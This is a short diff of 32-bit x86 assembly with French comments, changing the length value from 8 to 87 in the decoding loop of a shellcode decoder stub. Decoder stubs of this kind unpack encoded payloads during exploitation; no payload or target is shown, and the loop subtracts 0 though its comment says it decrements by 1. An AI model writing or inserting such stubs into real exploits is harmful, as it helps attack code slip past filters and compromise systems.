@@ -5,7 +5,7 @@ BITS 32
 	one:
 	 pop esi	
 	 xor ecx, ecx
-	 mov cl, 8			; On place dans %cl la taille de notre shellcode
+	 mov cl, 87			; On place dans %cl la taille de notre shellcode
 
 	two:
 	 sub byte [esi + ecx -1], 0	; on décrémente de 1 notre chaîne
